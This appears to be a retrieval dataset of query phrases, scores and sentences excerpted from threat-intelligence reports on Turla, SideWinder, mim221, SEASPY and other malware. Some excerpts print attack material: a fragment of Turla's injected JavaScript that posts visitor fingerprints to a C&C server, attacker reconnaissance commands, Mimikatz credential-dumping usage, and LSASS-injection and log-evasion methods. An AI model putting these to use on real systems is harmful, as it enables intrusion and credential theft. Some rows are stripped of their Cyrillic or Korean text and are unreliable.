a heavily obfuscated script|0.8101879572369328|['2/11/2020 Ransomware, Trojan and Miner together against PIK-Group Marco Ramilli Web Corner Ransomware, Trojan and Miner together against PIK-Group marcoramilli.com/2019/02/28/ransomware-trojan-and-miner-together-against-pik-group View all posts by marcoramilli February 28, 2019 When an unknown sender suggests me to click on a super wired url, dropping a ZIP file straight in my box, by saying its getting the next targeted attack on a huge company, well I kinda looking forward to it !', 'So I clicked on the link (see IOC section) and Ive downloaded a pik.zip file.', 'The zip file wrapped out an interesting cyrillic looking javascript file named:   , which according to google translate would be: PIK Group of Companies order details.', 'It looks like a crafted file for PIK-Group ,one of the most important real estate companies based in Russia with more then 14k employees !', 'By analysing such a script its clear that it wont be a piece of cake.', 'The script is heavily obfuscated with more techniques.', 'As you might appreciate from Stage0 (following image) there are two main obfuscation streams: the first one is implemented by introducing fake static forks such as: if and cases and the second one is implemented by dynamically building function blocks from nested strings which are either dynamically built and separated into multiple concatenation steps.', 'Javascript Stage0 The script eventually drops and executes (Stage0 Execution phase follows) a fake image file (msg.jpg) which actually is an UPX packet windows PE acting as second stage.', 'The second stage drops and executes three additional modules: a backdoor, a Miner and finally a quite known Ransomware.', 'It actually weird to understand the attackers needs, at such point, why so many different actors in an unique attack ?', 'Stage0 Execution According to pcrisk, the first downloaded module (327B0EF4.exe) looks like a well-known Troldesh Ransomware.']
obfuscated JavaScript code|0.7658022844322773|"['If the user is not in the Pakistani IP range, the server returns an 8-byte RTF file (file.rtf) that contains a single string: {\\\\rtf1 }.', 'However, if the user is within the Pakistani IP range, the server then returns the RTF payload, which varies between 406KB 414KB in size.', '7/15Figure 6: ""file.rtf"" malicious payload Loader Having listed the existing objects in the file.rtf file that was obtained from paknavy-gov- pk[.]downld[.', ']net domain, the 1.a object was extracted for further analysis.', 'Figure 7: ""1.a"" object overview During the malware execution chain, this object is saved under the C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\1.a location on the victims machine.', 'The 1.a file is an obfuscated JavaScript.', '8/15Figure 8: De-obfuscated strings There are two things that stand out from our analysis the base64 encoded data blob, and two URLs.', 'The base64 data blob decodes to Win32 DLL(App.dll), and the two URLs are used for further communications with the threat actor.', 'Figure 9: URLs used for further communications with SideWinder Agent The previously mentioned base64 encoded data blob is a .NET compiled Win32 DLL called App.dll.', 'Hashes (md5, 8934f22ed2d4390f2e6170e4cfdbd483 sha-256) 8b718a15f76768ba29849a5f4a6ca0ff1d9c8ba7bcdc9d89efc792fe20e9fdb5 ITW File Name App.dll Compilation Fri Nov 16 02:26:21 2074 Stamp File DLL Type/Signature File Size 139339 (bytes) Compiler Microsoft Visual C# / Basic .NET Name/Version 9/15To further avoid static signature-based detection, the App.dll file is obfuscated in the same way as the majority of other files and scripts uncovered in this campaign.', 'Figure 10: ""App.dll"" file The App.dll file is launched by earlier stage JavaScript code.']"
sent as a POST request|0.7893091541539821|"['It uses multiple storage places such as the local database, local shared objects (Flash cookies), Silverlight storage, etc., to store the cookie value.', 'In comparison to a regular cookie, it will be much more persistent as it wont be deleted if the user just deletes the browsers cookies.', 'This evercookie will be used to track whether the user visits one of the compromised websites again.', 'When the user comes back for a second time, the previously stored MD5 value will be used to identify them.', 'Then, it collects several pieces of information including the browser plugin list, the screen resolution and various operating system information.', 'This is sent to the C&C server in a POST request.', 'If there is a reply, it is assumed to be JavaScript code and is executed using the eval function.', ""1 [] 2 function f_ec(){ 3 var ec = new evercookie({domain:'http://skategirlchina[."", ""]com/wp- includes/data_from_db_top.php',baseurl:'?http://skategirlchina[."", ']com/wp- 4 includes/data_from_db_top.php\'}); 5 ec.get(""ec"", function(value) { https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/ 2/103/13/2020 Tracking Turla: New backdoor delivered via Armenian watering holes | WeLiveSecurity 6 if (value!=undefined){ 7 var jsonText = {\'ec\': \'\'+value+\'\', 8 \'scp\':screen.pixelDepth==undefined?', ""''+0+'':''+screen.pixelDepth+ '', 9 'scw':''+screen.width+'', 10 'sch':''+screen.height+'', 11 'bn':''+bn+'', 12 'bv':''+bv+'', 13 'bc':''+bc+'', 14 'osn':''+osn+'', 15 'osv':''+osv+'', 16 'osc':''+osc+'', 17 'adr':''+adr+'', 18 'pdr':''+pdr+'', 19 'fla':''+fla+'', 20 'jav':''+jav+'', 21 'wmp':''+wmp+'', 22 'msw':''+msw+'', 23 'qui':''+qui+'', 24 'sho':''+sho+'', 25 'type':'info', 26 'tiz': ''+(new Date().getTimezoneOffset()/60)+'' 27 }; 28 var json = JSON.stringify(jsonText); 29 ajax({ 30 content_type : 'application/json', 31 url: 'http://skategirlchina[.]com/wp-includes/data_from_db_top.php?""]"
decoded by Shellcode|0.7504404653748094|['Rancor Also, we categorized the various characteristics of the RTF files used by these groups and showed what they have in common.', 'Updates Its been a year since we introduced Royal Road.', 'In the meantime, the RTF file, believed to have been generated by Royal Road, has been used many times in targeted attacks, and several updates have been observed.', 'First of all, we will introduce the updates.', 'The RTF file generated by Royal Road contains encoded malware.', 'It is decoded by Shellcode after exploit.', 'In our previous blog, we introduced the following 5 encodings.', '1.', '4D 5A 90 00 (not encoded) 2.', 'F2 A3 20 72 3.', 'B2 A6 6D FF 4.']
screenshots|0.7692399556069283|['Ability to keep memory artifacts hidden from EDRs and AV.', 'Direct Windows SYS calls on the fly.', 'Egress over HTTP, HTTPS, DNS Over HTTPS, SMB and TCP.', 'LDAP Sentinel provides a rich GUI interface to query various LDAP queries to the domain or a forest.', 'Multiple command and control channels multiple pivot options such as SMB, TCP, WMI, WinRM and managing remote services over RPC.', 'Take screenshots.', 'x64 shellcode loader.', 'Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).']
screenshots|0.862232122747062|"[""Keylogger Keylogger stores keystrokes to the following file: %TEMP%\\\\log%d.txt Here is a sample of malware key-log output: (((((((Hello new File))))))))) +++++++++++++ Window= VMware Accelerated AMD PCNet Adapter (Microsoft's Packet Scheduler) : Capturing - Wireshark +++++++++++++ [UP][DOWN][DOWN][UP][UP][DOWN][UP][DOWN][DOWN][UP][UP][DOWN][DOWN][DOWN][UP][UP][UP][UP] [DOWN][DOWN][DOWN][DOWN]r +++++++++++++ Window= Run +++++++++++++ cmd[ENTER] +++++++++++++ Window= C:\\\\WINDOWS\\\\system32\\\\cmd.exe +++++++++++++ notepad[ENTER] +++++++++++++ Window= VMware Accelerated AMD PCNet Adapter (Microsoft's Packet Scheduler) : Capturing - Wireshark +++++++++++++ [DOWN][UP] +++++++++++++ Window= Untitled - Notepad +++++++++++++ test test test +++++++++++++ 2015 Check Point Software Technologies Ltd. All rights reserved | 34This file will be sent to remote C&C server later on."", 'If the malware detects an open Gmail, Yahoo or Outlook window, it will add special processing so the attacker can easily recognize the data that is the most valuable to him.', 'The following string will be appended to the output file: \\\\r/////////////\\\\r\\\\nMail Find Webcam capture The malware may capture photos from an attached webcam.', 'Files are first saved with the name test.bmp, later converted to JPEG and saved under the new file name Cam.jpg, eventually exfiltrated to the C&C server.', 'TCP Connection Table The malware will gather available metadata regarding current TCP connections using the GetTcpTable API, and send a formatted version of the obtained data to the C&C server.', 'Screenshots The malware may take screenshots.', 'The filename used for screenshots is Screeny.jpeg.', 'Remote Shell (Live Command Execution) The malware creates the following process as a live command prompt: cmd.exe /c cmd.exe This process output and input are attached and redirected via pipes to the remote C&C server, allowing the operator to type in commands to control the victim computer.', 'The following line is first sent to the server: Welcome To mpkshell Command Line (This Message Send From Server) Traffic Monitoring The malware may sniff all TCP and UDP traffic on the machine.', 'This is achieved through the use of RAW sockets.', 'The following status strings can be sent to the C&C server: Initializing Winsock 2.2...']"
screenshots|0.8601624749503709|"['Next, the script will start its associated services at the current runlevel.', 'After logging functionalities are started, the script will then check if the runlevel is 3, which will result in the terminal screen being cleared using /usr/bin/clear.', 'Finally, the script contains the command /sbin/BarracudaMailService eth0 at the end.', 'BarracudaMailService will be started automatically when the initialization script is run on the network interface eth0.', 'BarracudaMailService is a known name for the SEASPY backdoor.', 'Screenshots Figure 1.', '- At the end of the script the string ""/sbin/BarracudaMailService eth0"" is specified.', '9bb7addd96f99a29658aca9800b66046823c5ef0755e29012983db6f06a999cf Tags trojan Details Name resize_reisertab Size 2549176 bytes Type ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=c971d01d9faa9d7fd94aef13b24e0b5d3d149a7c, stripped MD5 45b79949276c9cb9cf5dc72597dc1006 SHA1 191e16b564c66b3db67f837e1dc5eac98ff9b9ef TLP: CLEAR CISA MAR-10454006.r4.v2.CLEAR 4 of 8TLP: CLEAR SHA256 9bb7addd96f99a29658aca9800b66046823c5ef0755e29012983db6f06a999cf SHA512 0f4307b5f48c193c1036b56b3cf569f79cb8fc2306f8f796d5548bcd5a96fc52127d2186d980c71d5917eb6d6026e92405 a3cd453011503515e2e4f3311201c3 ssdeep 49152:4TnrmLlCGFyVfj+QCH2qirsZZrnYgBbfhceT+c02:KnrXxj317rs/NocJ Entropy 6.227206 Antivirus AhnLab Trojan/Linux.SeaSpy.2549176 Antiy Trojan/Linux.SeaSpy.a Bitdefender Trojan.Linux.Generic.298117 Emsisoft Trojan.Linux.Generic.298117 (B) ESET a variant of Linux/SeaSpy.A trojan IKARUS Trojan.Linux.Seaspy Varist E64/SeaSpy.A YARA Rules rule CISA_10452108_01 : SEASPY backdoor communicates_with_c2 installs_other_components { meta: Author = ""CISA Code & Media Analysis"" Incident = ""10452108"" Date = ""2023-06-20"" Last_Modified = ""20230628_1000"" Actor = ""n/a"" Family = ""SEASPY"" Capabilities = ""communicates-with-c2 installs-other-components"" Malware_Type = ""backdoor"" Tool_Type = ""unknown"" Description = ""Detects malicious Linux SEASPY samples"" SHA256_1 = ""3f26a13f023ad0dcd7f2aa4e7771bba74910ee227b4b36ff72edc5f07336f115"" SHA256_2 = ""69935a1ce0240edf42dbe24535577140601bcf3226fa01e4481682f6de22d192"" SHA256_3 = ""5f5b8cc4d297c8d46a26732ae47c6ac80338b7be97a078a8e1b6eefd1120a5e5"" SHA256_4 = ""10efa7fe69e43c189033006010611e84394569571c4f08ea1735073d6433be81"" strings: $s0 = { 2e 2f 42 61 72 72 61 63 75 64 61 4d 61 69 6c 53 65 72 76 69 63 65 20 65 74 68 30 } $s1 = { 75 73 61 67 65 3a 20 2e 2f 42 61 72 72 61 63 75 64 61 4d 61 69 6C 53 65 72 76 69 63 65 20 3c 4e 65 74 77 6f 72 6b 2d 49 6e 74 65 72 66 61 63 65 } $s2 = { 65 6e 74 65 72 20 6f 70 65 6e 20 74 74 79 20 73 68 65 6c 6c } $s3 = { 25 64 00 4e 4f 20 70 6f 72 74 20 63 6f 64 65 } $s4 = { 70 63 61 70 5f 6c 6f 6f 6b 75 70 6e 65 74 3a 20 25 73 } $s5 = { 43 68 69 6c 64 20 70 72 6f 63 65 73 73 20 69 64 3a 25 64 } $s6 = { 5b 2a 5d 53 75 63 63 65 73 73 21 } $a7 = { bf 90 47 90 ec 18 fe e3 83 e2 a9 f7 8d 85 18 1d } $a8 = { 81 35 1e f0 94 ab 2a ba 5d f0 37 76 69 19 9f 1e } $a9 = { 6a 8e c7 89 ce c1 fe 64 78 a6 e1 c5 fe 03 d1 a7 } $a10 = { c2 ff d1 0d 24 23 ec c0 57 f9 8d 4b 05 34 41 b8 } condition: uint32(0) == 0x464c457f and (all of ($s*)) or ( all of ($a*)) } ssdeep Matches No matches found.', 'Description This artifact is a 64-bit ELF file that has been identified as a ""SEASPY"" malware variant installed as a system service.', 'This variant TLP: CLEAR CISA MAR-10454006.r4.v2.CLEAR 5 of 8TLP: CLEAR of SEASPY has had its symbols stripped.', 'The malware is a persistent backdoor that masquerades as a legitimate Barracuda Networks service.']"
screenshots|0.7692399556069283|['All the modules we observed contain shared code responsible for: Encrypting the data.', 'Exfiltrating gathered data through a POST request or by uploading it to an FTP server.', 'Sending execution logs to a remote server.', 'In addition to this, each module performs some specific job.', 'We managed to retrieve and analyze the next modules: List installed applications.', 'Take screenshots.', '4/14List running processes.', 'Get OS and computer information.', 'Execute a predefined command from the C&C.', 'Clean up any traces created by different modules.', 'Applications Module This module uses two methods to fetch installed applications.']
The initial attack phase involves infiltrating Internet-facing Microsoft Exchange servers|0.8326681983117583|['We assess that this activity represents an evolution of tooling associated with Operation Soft Cell.', 'While it is highly likely that the threat actor is a Chinese cyberespionage group in the nexus of Gallium and APT41, the exact grouping remains unclear.', 'SentinelLabs observed the use of a well-maintained, versioned credential theft capability and a new dropper mechanism indicative of an ongoing development effort by a highly-motivated threat actor with specific tasking requirements.', 'Overview In collaboration with QGroup GmbH, SentinelLabs recently observed initial threat activities targeting the telecommunication sector.', 'We assess it is highly likely that these attacks were conducted by a Chinese cyberespionage actor related to the Operation Soft Cell campaign.', 'The initial attack phase involves infiltrating Internet-facing Microsoft Exchange servers to deploy webshells used for command execution.', 'Once a foothold is established, the attackers conduct a variety of reconnaissance, credential theft, lateral movement, and data exfiltration activities.', 'The deployment of custom credential theft malware is central to this new campaign.', 'The malware implemented a series of Mimikatz modifications on closed-source tooling.', 'This post details the multi-component architecture and functionality of a sample, referred to as mim221.', 'We assess that mim221 is a recent version of an actively maintained credential theft capability upgraded with new anti-detection features.']
The malware implemented a series of Mimikatz modifications on closed-source tooling|1.0000000000000002|['Overview In collaboration with QGroup GmbH, SentinelLabs recently observed initial threat activities targeting the telecommunication sector.', 'We assess it is highly likely that these attacks were conducted by a Chinese cyberespionage actor related to the Operation Soft Cell campaign.', 'The initial attack phase involves infiltrating Internet-facing Microsoft Exchange servers to deploy webshells used for command execution.', 'Once a foothold is established, the attackers conduct a variety of reconnaissance, credential theft, lateral movement, and data exfiltration activities.', 'The deployment of custom credential theft malware is central to this new campaign.', 'The malware implemented a series of Mimikatz modifications on closed-source tooling.', 'This post details the multi-component architecture and functionality of a sample, referred to as mim221.', 'We assess that mim221 is a recent version of an actively maintained credential theft capability upgraded with new anti-detection features.', 'The use of special-purpose modules that implement a range of advanced techniques shows the threat actors dedication to advancing its toolset towards maximum stealth.', 'These techniques include in-memory mapping of malicious images to evade EDR API hooks and file-based detections surgically terminating Event Log threads instead of the host process to inhibit logging without raising suspicions staging a credential theft capability in the LSASS process itself by abusing native Windows capabilities.', 'Version numbers and build timestamps indicate a maintained software project by designated developers.']
stealing credentials from the Local Security Authority Subsystem Service (LSASS) process.|0.7966825479661725|"['5.', 'This file automatically writes its results in the text file ""Farse.log"" in the current directory.', 'As an example, when an executable file is run with the argument ""sss::logonpasswords"", the extracted passwords and hashes will be saved to this log file.', '6.', 'User and system credentials are retrieved through the use of the function ""sss::logonpasswords"" (in the original source code, Mimikatz is called ""sekurlsa::logonpasswords"").', 'This function retrieves credentials from the lsass system process.exe (Local Security Authority Subsystem Service).', 'Cleaner File name MD5 hash Program type cleaner.exe 8A9D278B473B6C5625D57739714702FC RAdmin log cleaner This file is designed to write garbage to the log file of RAdmin server connections deployed on the victim machine and to delete that file afterwards.', 'Due to programmers error, garbage is written not to the beginning of the file, but to its end, which makes it possible to retrieve the original log.', 'The program was compiled on 08.10.2017 at 07:46:09.', 'When run, the program generates random values whose length is file size C:\\\\Windows\\\\System32\\\\rserver30\\\\Radm_log.htm +10 up to C:\\\\Windows\\\\System32\\\\rserver30\\\\Radm_log.htm + 1024: 75Silence Moving into the darkside It then writes them to the end of the file and deletes the file.', 'Presumably, the programmers intention was to have these random values written to the beginning of the file so as to obstruct restoration of RAdmin connections logs.']"
This call instructs LSASS to load and execute pc.dll, which then stages the getHashFlsa64.dll credential theft component.|1.0000000000000002|['Security Packages are used to extend the Windows authentication mechanism and can be abused to execute malicious code in the context of LSASS.', 'In an attempt to remain undetected, AddSecurityPackage64.dll disables Windows event logging by killing threads of the Windows Event Log service without stopping the execution of the service itself.', 'This is achieved by locating the process that hosts the Event Log, enumerating the processes threads, identifying the threads assigned to the service by their service tag (eventlog), and terminating them.', 'Querying service tag information AddSecurityPackage64.dll injects pc.dll into LSASS by deploying pc.dll as a Security Package.', 'To this end, AddSecurityPackage64.dll issues an RPC call to LSASS to the ncalrpc:[lsasspirpc] RPC endpoint, providing the file path to pc.dll to LSASS.', 'This call instructs LSASS to load and execute pc.dll, which then stages the getHashFlsa64.dll credential theft component.', 'getHashFlsa64.dll conducts credential theft in the context of LSASS pc.dll and getHashFlsa64.dll In the context LSASS, pc.dll decrypts, reflectively loads, and executes the code credential theft component getHashFlsa64.dll in a manner similar to pc.exe.', 'pc.dll and getHashFlsa64.dll share the same original filename: getHashFlsa64.dll.', 'pc.dll is implemented such that its main routine returns FALSE, making LSASS execute pc.dll and then unload it.', 'This is a detection evasion technique making LSASS load pc.dll while avoiding appearing as an added (registered) Security Package.', 'LSASS normally creates registry entries when adding Security Packages and does not unload them once loaded.']
accesses the memory of its host LSASS process and stores stolen credentials in a Mimikatz log file|0.7692423598537663|['pc.dll is implemented such that its main routine returns FALSE, making LSASS execute pc.dll and then unload it.', 'This is a detection evasion technique making LSASS load pc.dll while avoiding appearing as an added (registered) Security Package.', 'LSASS normally creates registry entries when adding Security Packages and does not unload them once loaded.', 'This provides an opportunity for defenders to detect the loading of malicious Security Packages.', 'Previous research provides more detail on this topic.', 'getHashFlsa64.dll accesses the memory of its host LSASS process and stores stolen credentials in a Mimikatz log file named pc.log for later exfiltration.', '5/8Example pc.log content getHashFlsa64.dll exports a function named GetMyVersion, which displays a version number and build timestamp (Version 2.2.0 - build on May 28 2022 04:56:23), in a format consistent with the output from pc.exe.', 'The credential theft functionality of getHashFlsa64.dll is implemented in its export function GetLogonInfo.', 'The GetMyVersion function Additional Information Error Messages and Public Code Reuse The mim221 components implement error logging.', 'The error messages follow a consistent output format.', 'Example error messages It is important to note that we observed code segments that seem to be modified versions of publicly available code.']
The threat actors used C:\MS_DATA as their main working directory for storing malware and staging data for exfiltration|1.0000000000000002|"['APT41 is also known to target telecommunication providers.', 'Given previous target and TTP overlaps, and an evident familiarity with victim environments, we assess with medium- confidence that Gallium is involved.', 'However, we also recognize the possibility of closed-source tool-sharing between Chinese state-sponsored threat actors, and the possibility of a shared vendor or digital quartermaster.', 'Regardless of clustering specifics, this finding highlights the increased operational tempo of Chinese cyberespionage actors and their consistent investment in advancing their malware arsenal to evade detection.', 'Infection Vector and Initial TTPs As initial attack indicators, we observed command execution through webshells on compromised Microsoft Exchange server deployments.', 'The threat actors used C:\\\\MS_DATA as their main working directory for storing malware and staging data for exfiltration.', 'Noting that the Microsoft TroubleShootingScript toolset (TSSv2) uses C:\\\\MS_DATA for storing log files, we suspect that its use as a working directory is an attempt to make malicious file system activities look legitimate.', 'After establishing an initial foothold, the threat actor conducts reconnaissance like querying user and network information using a variety of tools.', 'For example, the attackers used dsquery and query to obtain information about Active Directory objects, including user information, and Remote Desktop user sessions.', 'They also used the Local Group (LG) tool to enumerate all local groups and members in a domain.', '""cmd"" /c cd /d C:\\\\MS_DATA\\\\&dsquery * -limit 0 -filter ""cmd"" /c cd /d C:\\\\MS_DATA\\\\&dsquery * -limit 0 -filter ""&(objectClass=User) (objectCategory=Person)"" -attr objectSID sAMAccountName displayName mail memberOf >da.back&cd ""cmd"" /c cd /d c:\\\\windows\\\\system32\\\\inetsrv\\\\&query user&cd ""cmd"" /c cd /d C:\\\\MS_DATA\\\\&lg.exe \\\\\\\\[IP ADDRESS] -lu >169.txt&cd The attackers then check connectivity with both the Internet and specific local machines of interest.']"
"""cmd""  /c"|0.8005088309270048|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
"""cmd""  /c"|1.0|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
"""cmd""  /c"|0.8005088309270048|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
"""cmd""  /c"|0.7893515727803749|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
"""cmd""  /c"|0.8005088309270048|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
"cmd""  /c"|0.8005088309270048|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
"cmd""  /c"|1.0|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
"cmd""  /c"|0.8005088309270048|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
"cmd""  /c"|0.7893515727803749|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
"cmd""  /c"|0.8005088309270048|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
pc.exe decrypts AddSecurityPackage64.dll and pc.dll using the AES encryption algorithm|0.8310872969522793|['mim221 The architecture of mim221 consists of four components: the pc.exe Windows executable, and the AddSecurityPackage64.dll, pc.dll, and getHashFlsa64.dll DLLs contained therein.', '3/8mim221 execution overview mim221 Component Size Compilation timestamp pc.exe 502 KBsThu Jun 09 08:02:12 2022 (UTC) AddSecurityPackage64.dll119 KB Thu Jun 09 08:01:46 2022 (UTC) pc.dll 297 KB Tue Jun 07 16:55:05 2022 (UTC) getHashFlsa64.dll 216 KB Fri May 27 20:56:26 2022 (UTC) pc.exe The main binary executed by the threat actor is pc.exe.', 'It decrypts AddSecurityPackage64.dll and pc.dll, stores pc.dll on the file system, and then loads and executes AddSecurityPackage64.dll by invoking its exported function, pathAddPackage.', 'The execution of pc.exe requires a password supplied by the operator (in this case, P2sSW0rd1234!', '@#$C), which the operator provides through the key command-line parameter.', 'pc.exe decrypts AddSecurityPackage64.dll and pc.dll using the AES encryption algorithm, providing the operator-provided execution password as an initialization vector.', 'pc.exe loads and executes the decrypted AddSecurityPackage64.dllusing reflective image loading.', 'This technique involves first mapping a Windows PE image in memory and then executing the images main entry point or an export function.', '4/8Among other activities, the image mapping process includes allocating memory for the image, storing the image headers and sections in the memory, populating the images import and delay import tables, adding exception handlers, and executing TLS callback and export routines.', 'The Phant0m tool provides a complete implementation of this process.', 'While reflective image loading is a known technique at this time, its use was first observed in the DoublePulsar and subsequently the SlingShot frameworks in 2017 and 2018, respectively.']
In an attempt to remain undetected, AddSecurityPackage64.dll disables Windows event logging by killing threads of the Windows Event Log service without stopping the execution of the service itself|1.0000000000000002|['When it is finished executing, pc.exe displays a message indicating a version number and build timestamp: Version 2.2.1 - build on Jun 9 2022 16:02:12.', 'AddSecurityPackage64.dll AddSecurityPackage64.dll, which is the original filename of this mim221 component, is responsible for: Obtaining the SeDebugPrivilege and SYSTEM privilege by access token impersonation.', 'This allows mim221 to inspect and extract credentials from the LSASS process.', 'Disabling Windows event logging in an attempt to evade detection; and Injecting pc.dll into LSASS as a Security Package.', 'Security Packages are used to extend the Windows authentication mechanism and can be abused to execute malicious code in the context of LSASS.', 'In an attempt to remain undetected, AddSecurityPackage64.dll disables Windows event logging by killing threads of the Windows Event Log service without stopping the execution of the service itself.', 'This is achieved by locating the process that hosts the Event Log, enumerating the processes threads, identifying the threads assigned to the service by their service tag (eventlog), and terminating them.', 'Querying service tag information AddSecurityPackage64.dll injects pc.dll into LSASS by deploying pc.dll as a Security Package.', 'To this end, AddSecurityPackage64.dll issues an RPC call to LSASS to the ncalrpc:[lsasspirpc] RPC endpoint, providing the file path to pc.dll to LSASS.', 'This call instructs LSASS to load and execute pc.dll, which then stages the getHashFlsa64.dll credential theft component.', 'getHashFlsa64.dll conducts credential theft in the context of LSASS pc.dll and getHashFlsa64.dll In the context LSASS, pc.dll decrypts, reflectively loads, and executes the code credential theft component getHashFlsa64.dll in a manner similar to pc.exe.']
tasklist|1.0|['Nomadic Octopus Paperbug CampaignTLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glossary 3 2 Introduction 3 3 ExecutiveSummary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']
